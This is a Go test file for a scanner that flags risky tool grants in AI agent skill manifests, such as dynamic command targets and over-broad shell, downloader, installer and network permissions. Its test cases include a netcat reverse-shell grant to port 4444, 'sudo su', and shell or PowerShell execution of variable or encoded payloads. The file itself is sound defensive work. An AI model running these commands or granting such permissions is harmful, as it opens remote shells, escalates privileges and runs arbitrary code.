package grants

import (
	"fmt"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/traceforce/skill-xray/internal/findings"
	"github.com/traceforce/skill-xray/internal/ingest"
	"github.com/traceforce/skill-xray/internal/parse"
	"github.com/traceforce/skill-xray/internal/testutil"
)

func parsed(t *testing.T, files map[string]string) *parse.Package {
	return parse.Parse(ingest.BuildPackage(testutil.MakePackage(t, files)))
}

// manifest is tests/test_grants.py::_manifest: the grant lines sit on line 3.
func manifest(lines ...string) string {
	return "---\nname: demo\n" + strings.Join(lines, "\n") + "\n---\nbody\n"
}

// run is tests/test_grants.py::_run: the SXV-003/004 findings of the package's checks.
func run(t *testing.T, files map[string]string) []findings.Finding {
	out := []findings.Finding{}
	for _, f := range Check(parsed(t, files)) {
		if f.Vector == "SXV-003" || f.Vector == "SXV-004" {
			out = append(out, f)
		}
	}
	return out
}

func skill(t *testing.T, lines ...string) []findings.Finding {
	return run(t, map[string]string{"SKILL.md": manifest(lines...)})
}

func first(fs []findings.Finding, vector string) *findings.Finding {
	for i := range fs {
		if fs[i].Vector == vector {
			return &fs[i]
		}
	}
	return nil
}

func ptr(b bool) *bool { return &b }

// want is what one tests/test_grants.py case asserts about the SXV-003/004 findings of one
// `allowed-tools: <specifier>` manifest.
type want struct {
	set      []string // exact vector set when non-nil (empty == no findings)
	variable string   // SXV-003 present with this variable_name ("*" = any)
	no003    bool     // no SXV-003 at all
	breadth  string   // SXV-004 present with this breadth_class ("*" = any)
	severity string   // SXV-004 severity, with breadth
	network  *bool    // SXV-004 reaches_network
}

var grantCases = []struct {
	name, specifier string
	want            want
}{
	// test_dynamic_execution_head_reports_sxv003 (12)
	{"dynamic_head[$TOOL]", "Bash($TOOL/run.sh)", want{variable: "$TOOL"}},
	{"dynamic_head[${BIN}]", "Bash(${BIN} deploy)", want{variable: "${BIN}"}},
	{"dynamic_head[$RUNNER]", "Shell($RUNNER/task.cmd)", want{variable: "$RUNNER"}},
	{"dynamic_head[%USERPROFILE%]", `Bash(%USERPROFILE%\tool.exe)`, want{variable: "%USERPROFILE%"}},
	{"dynamic_head[$env:USERPROFILE]", `Bash($env:USERPROFILE\tool.ps1)`, want{variable: "$env:USERPROFILE"}},
	{"dynamic_head[$Env:APPDATA]", `Bash($Env:APPDATA\tool.ps1)`, want{variable: "$Env:APPDATA"}},
	{"dynamic_head[$(command -v python)]", "Bash($(command -v python) task.py)", want{variable: "$(command -v python)"}},
	{"dynamic_head[`command -v python`]", "Bash(`command -v python` task.py)", want{variable: "`command -v python`"}},
	{"dynamic_head[${RUNNER:-python}]", "Bash(${RUNNER:-python} task.py)", want{variable: "${RUNNER:-python}"}},
	{"dynamic_head[$1]", "Bash($1 task.py)", want{variable: "$1"}},
	{"dynamic_head[&& $RUNNER]", "Bash(echo ok && $RUNNER payload)", want{variable: "$RUNNER"}},
	{"dynamic_head[sudo $RUNNER]", "Bash(sudo $RUNNER payload:*)", want{variable: "$RUNNER"}},
	// test_argument_or_non_execution_variables_do_not_report_sxv003 (5)
	{"argument_variable[echo $HOME]", "Bash(echo $HOME:*)", want{no003: true}},
	{"argument_variable[CONFIG=]", "Bash(CONFIG=$SKILL_DIR/config node build.js:*)", want{no003: true}},
	{"argument_variable[Read]", "Read($HOME/notes.md)", want{no003: true}},
	{"argument_variable[%PATH%]", "Bash(echo %PATH%:*)", want{no003: true}},
	{"argument_variable[$env:PATH]", "Bash(echo $env:PATH:*)", want{no003: true}},
	// test_broad_execution_grants_report_sxv004 (14)
	{"broad[Bash]", "Bash", want{breadth: "wildcard_all_commands", severity: "critical"}},
	{"broad[Bash(*)]", "Bash(*)", want{breadth: "wildcard_all_commands", severity: "critical"}},
	{"broad[Bash(:*)]", "Bash(:*)", want{breadth: "wildcard_all_commands", severity: "critical"}},
	{"broad[curl:*]", "Bash(curl:*)", want{breadth: "interpreter_or_downloader", severity: "high"}},
	{"broad[python -u -c:*]", "Bash(python -u -c:*)", want{breadth: "interpreter_or_downloader", severity: "high"}},
	{"broad[C:\\tools\\curl.exe:*]", `Bash(C:\\tools\\curl.exe:*)`, want{breadth: "interpreter_or_downloader", severity: "high"}},
	{"broad[C:\\tools\\curl.exe]", `Bash(C:\\tools\\curl.exe)`, want{breadth: "interpreter_or_downloader", severity: "high"}},
	{"broad[pip install requests]", "Bash(pip install requests)", want{breadth: "package_installer", severity: "high"}},
	{"broad[sudo python -c:*]", "Bash(sudo python -c:*)", want{breadth: "privilege_escalation", severity: "critical"}},
	{"broad[curl -fsSL URL:*]", "Bash(curl -fsSL https://example.invalid/x:*)", want{breadth: "interpreter_or_downloader", severity: "high"}},
	{"broad[nc -e]", "Bash(nc -e /bin/sh host 4444:*)", want{breadth: "interpreter_or_downloader", severity: "high"}},
	{"broad[echo ok && sudo su:*]", "Bash(echo ok && sudo su:*)", want{breadth: "privilege_escalation", severity: "critical"}},
	{"broad[\"curl\" -fsSL]", `Bash("curl" -fsSL https://example.invalid/x:*)`, want{breadth: "interpreter_or_downloader", severity: "high"}},
	{"broad[cmd.exe /c whoami:*]", "Bash(cmd.exe /c whoami:*)", want{breadth: "interpreter_or_downloader", severity: "high"}},
	// test_network_reachability_is_explicit_evidence (4)
	{"network_evidence[curl:*]", "Bash(curl:*)", want{network: ptr(true)}},
	{"network_evidence[*]", "Bash(*)", want{network: ptr(true)}},
	{"network_evidence[python -c:*]", "Bash(python -c:*)", want{network: ptr(true)}},
	{"network_evidence[eval:*]", "Bash(eval:*)", want{network: ptr(false)}},
	// test_narrow_or_non_execution_grants_are_not_reported (6)
	{"narrow[scripts/run.sh:*]", "Bash(scripts/run.sh:*)", want{set: []string{}}},
	{"narrow[python app.py]", "Bash(python app.py)", want{set: []string{}}},
	{"narrow[git log:*]", "Bash(git log:*)", want{set: []string{}}},
	{"narrow[Read]", "Read", want{set: []string{}}},
	{"narrow[Grep]", "Grep", want{set: []string{}}},
	{"narrow[WebFetch(domain:example.com)]", "WebFetch(domain:example.com)", want{set: []string{}}},
	// test_package_local_chmod_is_not_privilege_escalation
	{"package_local_chmod", "Bash(chmod +x scripts/setup.sh:*)", want{set: []string{}}},
	// test_later_network_segment_sets_network_evidence
	{"later_network_segment", "Bash(echo ok && curl https://example.invalid:*)", want{network: ptr(true)}},
	// test_posix_dynamic_command_targets_report_sxv003 (3)
	{"posix_dynamic[$@]", "Bash($@)", want{variable: "*"}},
	{"posix_dynamic[$*]", "Bash($*)", want{variable: "*"}},
	{"posix_dynamic[${RUNNER%/*}/tool]", "Bash(${RUNNER%/*}/tool)", want{variable: "*"}},
	// test_bare_installer_wildcards_are_broad (3)
	{"bare_installer[npm:*]", "Bash(npm:*)", want{breadth: "package_installer"}},
	{"bare_installer[apt:*]", "Bash(apt:*)", want{breadth: "package_installer"}},
	{"bare_installer[brew:*]", "Bash(brew:*)", want{breadth: "package_installer"}},
	// test_script_arguments_named_eval_are_not_interpreter_options
	{"script_argument_named_eval", "Bash(python app.py --eval $VALUE)", want{set: []string{}}},
	// test_literal_command_variables_are_not_dynamic (2)
	{"literal_variable['$RUNNER']", "Bash('$RUNNER' payload)", want{no003: true}},
	{"literal_variable[\\$RUNNER]", `Bash(\$RUNNER payload)`, want{no003: true}},
	// test_versioned_interpreter_network_evidence_is_normalized
	{"versioned_interpreter_network", "Bash(python3.12 -c:*)", want{network: ptr(true)}},
	// test_indirect_posix_command_target_reports_sxv003
	{"indirect_posix_target", "Bash(${!RUNNER} payload)", want{variable: "${!RUNNER}"}},
	// test_wrapped_command_substitution_reports_sxv003
	{"wrapped_substitution", "Bash(timeout 5 $(command -v python) task.py)", want{variable: "$(command -v python)"}},
	// test_attached_eval_payload_reports_both_grant_risks (2)
	{"attached_eval[-c$PAYLOAD]", "Bash(sh -c$PAYLOAD)", want{set: []string{"SXV-003", "SXV-004"}}},
	{"attached_eval[-c\"$PAYLOAD\"]", `Bash(sh -c"$PAYLOAD")`, want{set: []string{"SXV-003", "SXV-004"}}},
	// test_versioned_interpreter_dynamic_payload_reports_sxv003
	{"versioned_interpreter_payload", `Bash(python3.12 -c "$PAYLOAD")`, want{variable: "*"}},
	// test_installer_grants_record_network_reachability (2)
	{"installer_network[pip]", "Bash(pip install requests)", want{network: ptr(true)}},
	{"installer_network[apt]", "Bash(apt install curl)", want{network: ptr(true)}},
	// test_npm_ci_is_an_installer_grant
	{"npm_ci", "Bash(npm ci:*)", want{breadth: "package_installer", network: ptr(true)}},
	// test_unrestricted_git_grant_is_broad_and_network_capable
	{"unrestricted_git", "Bash(git:*)", want{network: ptr(true)}},
	// test_quoted_command_substitution_is_not_dynamic
	{"quoted_substitution", "Bash(echo 'safe; $(command -v python)')", want{no003: true}},
	// test_executable_command_substitutions_report_sxv003 (3)
	{"executable_substitution[/opt/$(cat selected)/run]", "Bash(/opt/$(cat selected)/run)", want{variable: "*"}},
	{"executable_substitution[\"$(command -v python)\"]", `Bash("$(command -v python)" task.py)`, want{variable: "*"}},
	{"executable_substitution[sh -c \"$(cat payload)\"]", `Bash(sh -c "$(cat payload)")`, want{variable: "*"}},
	// test_long_command_substitution_is_still_detected
	{"long_substitution", "Bash($(printf " + strings.Repeat("x", 300) + ") task.py)", want{variable: "*"}},
	// test_env_option_value_is_not_treated_as_executable
	{"env_option_value", "Bash(env -C $DIR curl:*)", want{no003: true, network: ptr(true)}},
	// test_powershell_grant_records_network_capability
	{"powershell_network", "Bash(powershell -Command Invoke-WebRequest:*)", want{network: ptr(true)}},
	// test_python_pip_read_only_command_stays_narrow
	{"pip_read_only", "Bash(python -m pip list)", want{set: []string{}}},
	// test_git_remote_grants_are_network_capable (4)
	{"git_remote[clone]", "Bash(git clone:*)", want{network: ptr(true)}},
	{"git_remote[fetch]", "Bash(git fetch:*)", want{network: ptr(true)}},
	{"git_remote[pull]", "Bash(git pull:*)", want{network: ptr(true)}},
	{"git_remote[push]", "Bash(git push:*)", want{network: ptr(true)}},
	// test_braced_powershell_environment_target_reports_sxv003
	{"braced_powershell_env", `Bash(${env:USERPROFILE}\tool.ps1)`, want{variable: "*"}},
	// test_additional_installer_and_network_clients_are_broad (3)
	{"additional_clients[apk add:*]", "Bash(apk add:*)", want{network: ptr(true)}},
	{"additional_clients[ftp:*]", "Bash(ftp:*)", want{network: ptr(true)}},
	{"additional_clients[telnet:*]", "Bash(telnet:*)", want{network: ptr(true)}},
	// test_bare_delegating_wrapper_is_broad (3)
	{"bare_wrapper[timeout]", "Bash(timeout:*)", want{breadth: "*"}},
	{"bare_wrapper[command]", "Bash(command:*)", want{breadth: "*"}},
	{"bare_wrapper[nohup]", "Bash(nohup:*)", want{breadth: "*"}},
	// test_argument_substitution_is_not_a_dynamic_command_target
	{"argument_substitution", "Bash(echo $(date))", want{no003: true}},
	// test_python_uppercase_e_option_is_not_eval
	{"python_uppercase_E", "Bash(python -E app.py $VALUE)", want{set: []string{}}},
	// test_single_quoted_fragment_in_command_head_is_literal
	{"single_quoted_fragment", "Bash(foo'$RUNNER')", want{set: []string{}}},
	// test_posix_substring_command_target_reports_sxv003
	{"posix_substring", "Bash(${RUNNER:0})", want{variable: "*"}},
	// test_eval_builtin_dynamic_payload_reports_both_risks
	{"eval_builtin", `Bash(eval "$PAYLOAD")`, want{set: []string{"SXV-003", "SXV-004"}}},
	// test_single_quotes_inside_double_quotes_do_not_hide_substitution
	{"single_inside_double", `Bash("x'$(command -v python)'" task.py)`, want{variable: "*"}},
	// test_installer_global_options_do_not_hide_install (2)
	{"installer_global_options[pip --user]", "Bash(pip --user install requests:*)", want{breadth: "package_installer"}},
	{"installer_global_options[apt -y]", "Bash(apt -y install curl:*)", want{breadth: "package_installer"}},
	// test_additional_braced_command_expansions_report_sxv003 (3)
	{"braced_expansion[${RUNNER-python}]", "Bash(${RUNNER-python})", want{variable: "*"}},
	{"braced_expansion[${RUNNER/pat/repl}]", "Bash(${RUNNER/pat/repl})", want{variable: "*"}},
	{"braced_expansion[${RUNNER^^}]", "Bash(${RUNNER^^})", want{variable: "*"}},
	// test_shell_clustered_command_option_reports_both_risks
	{"shell_clustered_option", `Bash(bash -lc "$PAYLOAD")`, want{set: []string{"SXV-003", "SXV-004"}}},
	// test_cargo_global_option_value_does_not_hide_install
	{"cargo_option_value", "Bash(cargo --color always install ripgrep)", want{breadth: "package_installer"}},
	// test_exec_wrapper_exposes_dynamic_command_target
	{"exec_wrapper", "Bash(exec $RUNNER payload)", want{variable: "*"}},
	// test_stdbuf_option_value_does_not_hide_network_command
	{"stdbuf_option_value", "Bash(stdbuf -o L curl:*)", want{network: ptr(true)}},
	// test_bare_cmd_grant_is_broad
	{"bare_cmd", "Bash(cmd.exe:*)", want{breadth: "*"}},
	// test_uv_pip_read_only_command_stays_narrow, test_uv_pip_install_remains_broad
	{"uv_pip_list", "Bash(uv pip list)", want{set: []string{}}},
	{"uv_pip_install", "Bash(uv pip install requests)", want{breadth: "*"}},
	// test_unrestricted_network_grant_reports_capability_risk (2)
	{"unrestricted_network[WebFetch]", "WebFetch", want{set: []string{"SXV-004"}, breadth: "unrestricted_network", severity: "high", network: ptr(true)}},
	{"unrestricted_network[WebSearch]", "WebSearch", want{set: []string{"SXV-004"}, breadth: "unrestricted_network", severity: "high", network: ptr(true)}},
	// test_network_wildcards_are_unrestricted (7)
	{"network_wildcard[WebFetch(*)]", "WebFetch(*)", want{set: []string{"SXV-004"}, breadth: "unrestricted_network"}},
	{"network_wildcard[WebFetch(**)]", "WebFetch(**)", want{set: []string{"SXV-004"}, breadth: "unrestricted_network"}},
	{"network_wildcard[WebFetch(:*)]", "WebFetch(:*)", want{set: []string{"SXV-004"}, breadth: "unrestricted_network"}},
	{"network_wildcard[WebFetch(domain:*)]", "WebFetch(domain:*)", want{set: []string{"SXV-004"}, breadth: "unrestricted_network"}},
	{"network_wildcard[WebSearch(*)]", "WebSearch(*)", want{set: []string{"SXV-004"}, breadth: "unrestricted_network"}},
	{"network_wildcard[WebSearch(**)]", "WebSearch(**)", want{set: []string{"SXV-004"}, breadth: "unrestricted_network"}},
	{"network_wildcard[WebSearch(:*)]", "WebSearch(:*)", want{set: []string{"SXV-004"}, breadth: "unrestricted_network"}},
	// test_fixed_python_modules_are_not_misclassified_as_installers (2)
	{"fixed_python_module[pytest]", "Bash(python -m pytest:*)", want{set: []string{}}},
	{"fixed_python_module[json.tool]", "Bash(python -m json.tool:*)", want{set: []string{}}},
	// test_python_installer_modules_are_package_installers (2)
	{"python_installer_module[pip install]", "Bash(python -m pip install requests:*)", want{breadth: "package_installer"}},
	{"python_installer_module[ensurepip]", "Bash(python3 -m ensurepip:*)", want{breadth: "package_installer"}},
	// test_python_http_server_module_is_network_capable
	{"python_http_server", "Bash(python3 -m http.server:*)", want{network: ptr(true)}},
	// test_fish_dynamic_payload_reports_both_risks
	{"fish_dynamic_payload", `Bash(fish -c "$PAYLOAD")`, want{set: []string{"SXV-003", "SXV-004"}}},
	// test_python_module_installer_options_do_not_hide_install
	{"python_module_installer_options", "Bash(python -m pip --proxy URL install pkg)", want{breadth: "*"}},
	// test_command_lookup_variable_is_not_dynamic_execution
	{"command_lookup_variable", "Bash(command -v $TOOL)", want{set: []string{}}},
	// test_python_clustered_command_option_reports_both_risks
	{"python_clustered_option", `Bash(python -Ic "$PAYLOAD")`, want{set: []string{"SXV-003", "SXV-004"}}},
	// test_dotnet_tool_list_stays_narrow, test_dotnet_mutating_tool_actions_are_broad (3)
	{"dotnet_tool_list", "Bash(dotnet tool list)", want{set: []string{}}},
	{"dotnet_tool[install]", "Bash(dotnet tool install)", want{breadth: "*"}},
	{"dotnet_tool[update]", "Bash(dotnet tool update)", want{breadth: "*"}},
	{"dotnet_tool[restore]", "Bash(dotnet tool restore)", want{breadth: "*"}},
	// test_wrapper_option_values_do_not_hide_broad_commands (2)
	{"wrapper_option_values[env -u]", "Bash(env -u TOKEN curl:*)", want{breadth: "interpreter_or_downloader"}},
	{"wrapper_option_values[timeout --signal]", "Bash(timeout --signal KILL 5 curl:*)", want{breadth: "interpreter_or_downloader"}},
	// test_wrapper_around_narrow_local_script_stays_narrow
	{"wrapper_around_narrow_script", "Bash(timeout 5 scripts/run.sh:*)", want{set: []string{}}},
	// test_dynamic_downloader_path_can_report_both_risks
	{"dynamic_downloader_path", "Bash($TOOLS/curl:*)", want{set: []string{"SXV-003", "SXV-004"}}},
	// test_dynamic_interpreter_payload_reports_sxv003 (4)
	{"dynamic_interpreter_payload[sh -c]", `Bash(sh -c "$RUNNER")`, want{variable: "$RUNNER"}},
	{"dynamic_interpreter_payload[cmd /c]", "Bash(cmd /c %COMSPEC%)", want{variable: "%COMSPEC%"}},
	{"dynamic_interpreter_payload[powershell -Command]", "Bash(powershell -Command $PAYLOAD)", want{variable: "$PAYLOAD"}},
	{"dynamic_interpreter_payload[pwsh -EncodedCommand]", "Bash(pwsh -EncodedCommand $ENCODED)", want{variable: "$ENCODED"}},
	// test_aria2c_grant_is_broad_and_network_capable
	{"aria2c", "Bash(aria2c:*)", want{breadth: "interpreter_or_downloader", network: ptr(true)}},
}

// tests/test_grants.py single-specifier cases (see grantCases): every SXV-003/004 finding of a
// `Bash(...)`/`WebFetch(...)` line 3 grant is checked for rule, severity, path, line and the
// evidence the pytest names.
func TestGrantSpecifiers(t *testing.T) {
	for _, c := range grantCases {
		t.Run(c.name, func(t *testing.T) {
			fs := skill(t, "allowed-tools: "+c.specifier)
			w := c.want
			if w.set != nil {
				got := []string{}
				for _, f := range fs {
					got = append(got, f.Vector)
				}
				assert.ElementsMatch(t, w.set, got)
			}
			if w.no003 {
				assert.Nil(t, first(fs, "SXV-003"))
			}
			if w.variable != "" {
				f := first(fs, "SXV-003")
				require.NotNil(t, f)
				assert.Equal(t, []any{"grant-variable-substitution", "high", "SKILL.md", 3}, []any{f.Rule, f.Severity, f.Path, *f.Line})
				if w.variable != "*" {
					assert.Equal(t, map[string]any{"grant_text": c.specifier, "variable_name": w.variable, "line": 3}, f.Evidence)
					assert.Equal(t, fmt.Sprintf("execution pre-grant `%s` has a dynamic command target (%s)", c.specifier, w.variable), f.Message)
				}
			}
			if w.breadth != "" || w.network != nil || w.severity != "" {
				f := first(fs, "SXV-004")
				require.NotNil(t, f)
				assert.Equal(t, []any{"grant-over-broad", "SKILL.md", 3, c.specifier}, []any{f.Rule, f.Path, *f.Line, f.Evidence["grant_text"]})
				if w.breadth != "" && w.breadth != "*" {
					assert.Equal(t, w.breadth, f.Evidence["breadth_class"])
					assert.Equal(t, fmt.Sprintf("pre-granted tool `%s` is over-broad (%s)", c.specifier, w.breadth), f.Message)
				}
				if w.severity != "" {
					assert.Equal(t, w.severity, f.Severity)
				}
				if w.network != nil {
					assert.Equal(t, *w.network, f.Evidence["reaches_network"])
				}
			}
		})
	}
}

// test_newline_starts_an_independent_grant_command: a block scalar's newline separates commands.
func TestNewlineStartsAnIndependentGrantCommand(t *testing.T) {
	fs := skill(t, "allowed-tools: |", "  Bash(echo ok", "  curl https://example.invalid:*)")
	f := first(fs, "SXV-004")
	require.NotNil(t, f)
	assert.Equal(t, true, f.Evidence["reaches_network"])
}

// test_broad_denial_closes_same_allowed_tool, test_wildcard_denial_closes_same_allowed_tool,
// test_exact_narrow_denial_closes_matching_allow, test_prefix_denial_closes_narrower_matching_allow,
// test_disallowed_grant_is_never_treated_as_risk
func TestDenialsCloseAllows(t *testing.T) {
	for _, lines := range [][]string{
		{"allowed-tools: Bash", "disallowed-tools: Bash"},
		{"allowed-tools: Bash", "disallowed-tools: Bash(*)"},
		{"allowed-tools: Bash(curl:*)", "disallowed-tools: Bash(curl:*)"},
		{"allowed-tools: Bash(curl https://example.invalid:*)", "disallowed-tools: Bash(curl:*)"},
		{"allowed-tools: Bash(scripts/run.sh:*)", "disallowed-tools: Bash(curl:*)"},
	} {
		assert.Empty(t, skill(t, lines...), lines)
	}
}

// test_disallowed_grant_does_not_mask_allowed_risk
func TestDisallowedGrantDoesNotMaskAllowedRisk(t *testing.T) {
	fs := skill(t, "allowed-tools: Bash(sudo:*)", "disallowed-tools: Bash(curl:*)")
	require.Len(t, fs, 1)
	assert.Equal(t, []any{"SXV-004", "privilege_escalation"}, []any{fs[0].Vector, fs[0].Evidence["breadth_class"]})
}

// test_non_manifest_grants_are_out_of_scope
func TestNonManifestGrantsAreOutOfScope(t *testing.T) {
	assert.Empty(t, run(t, map[string]string{
		"SKILL.md": manifest("allowed-tools: Read"),
		"guide.md": manifest("allowed-tools: Bash(curl:*)"),
	}))
}

// test_malformed_allowed_tools_remains_visible_as_incomplete_analysis (the grants half; the
// grants_unparsed_shape coverage-note is checks.Coverage's) and
// test_malformed_scalar_grant_is_visible_and_does_not_disable_siblings (2).
func TestMalformedGrants(t *testing.T) {
	assert.Empty(t, skill(t, "allowed-tools: [Read, {Bash: true}]"))
	for _, specifier := range []string{"Bash(curl:*", `Bash("curl:*)`} {
		fs := skill(t, fmt.Sprintf("allowed-tools: [%s, Bash(sudo:*)]", specifier))
		f := first(fs, "SXV-004")
		require.NotNil(t, f, specifier)
		assert.Equal(t, "privilege_escalation", f.Evidence["breadth_class"], specifier)
	}
}

// test_grant_findings_are_capped_with_visible_note: 28 dynamic heads keep 25 SXV-003 and a note.
func TestGrantFindingsAreCappedWithVisibleNote(t *testing.T) {
	var grants []string
	for i := range 28 {
		grants = append(grants, fmt.Sprintf("Bash($TOOL%d/run)", i))
	}
	fs := Check(parsed(t, map[string]string{"SKILL.md": manifest("allowed-tools: [" + strings.Join(grants, ", ") + "]")}))
	n, note := 0, false
	for _, f := range fs {
		n += map[bool]int{true: 1}[f.Vector == "SXV-003"]
		note = note || f.Rule == "findings-capped" && strings.Contains(f.Message, "3 more SXV-003 findings")
	}
	assert.Equal(t, 25, n)
	assert.True(t, note)
}

func grantsOf(t *testing.T, frontmatter string) []parse.Grant {
	return parsed(t, map[string]string{"SKILL.md": "---\nname: t\n" + frontmatter + "\n---\n"}).ByRel["SKILL.md"].Grants
}

// test_network_denials_survive_both_capability_passes,
// test_denials_do_not_forbid_indirect_or_partially_scoped_capabilities (11),
// test_capability.py::test_partial_denial_does_not_deny_entire_axis
func TestDeniedCapabilities(t *testing.T) {
	for tool, want := range map[string]map[string]bool{
		"WebFetch": {"network": true},
		"Bash":     {"execution": true}, "WebFetch(domain:example.invalid)": {},
		"WebFetch( * )": {"network": true}, "WebSearch(**)": {"network": true}, "WebFetch(**)": {"network": true},
		"Bash(curl:*)": {}, "Bash(rm:*)": {}, "Shell(python:*)": {},
		"Bash( ** )": {"execution": true}, "Shell(:*)": {"execution": true},
		"WebFetch(domain:*)": {"network": true}, "WebSearch(DOMAIN:*)": {"network": true},
	} {
		assert.Equal(t, want, Denied(grantsOf(t, "disallowed-tools: "+tool)), tool)
	}
}

// test_capability.py::test_grants_reuse_parser_and_explicit_states, the grants-level facts
// behind the declared network states, and test_capability::test_partial_denial_does_not_deny_entire_axis.
func TestDeclaredAndEffectiveGrants(t *testing.T) {
	assert.Equal(t, map[string]bool{"network": true}, Declared(grantsOf(t, "allowed-tools: WebFetch")))
	assert.Equal(t, map[string]bool{}, Declared(grantsOf(t, "disallowed-tools: WebFetch")))
	both := grantsOf(t, "allowed-tools: WebFetch\ndisallowed-tools: WebFetch(DOMAIN:*)")
	assert.Empty(t, Effective(both))
	assert.Equal(t, map[string]bool{}, Declared(both))
	assert.Equal(t, map[string]bool{"network": true}, Denied(both))
}

// Corpus parity against tools/parity/py_dump_findings.py grants.
func TestCorpusParity(t *testing.T) {
	testutil.CheckParity(t, "grants", func(dir string) []findings.Finding {
		return Check(parse.Parse(ingest.BuildPackage(dir)))
	})
}
